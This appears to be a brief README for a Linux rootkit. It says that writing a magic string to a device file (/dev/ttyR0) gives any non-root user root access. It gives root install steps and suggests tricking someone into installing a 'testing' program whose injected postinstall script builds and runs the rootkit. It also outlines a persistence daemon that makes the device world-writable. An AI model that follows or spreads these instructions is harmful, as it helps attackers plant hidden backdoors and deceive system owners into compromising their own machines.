Usage: after installing execute from any non-root user "echo g0tR0ot > /dev/ttyR0". You will get root access. execute "id" to check it.

Install: 
su -c 'bash install.sh'
You will need to enter root password. But if you have a live usb with same core you can build it in chroot. 
Or you can use Social Engeneering like "install this program please, for testing" and inject postinstall script wich builds and runs rootkit.

For persistence you will need to do daemon wich giving 0666 permissions to device file.
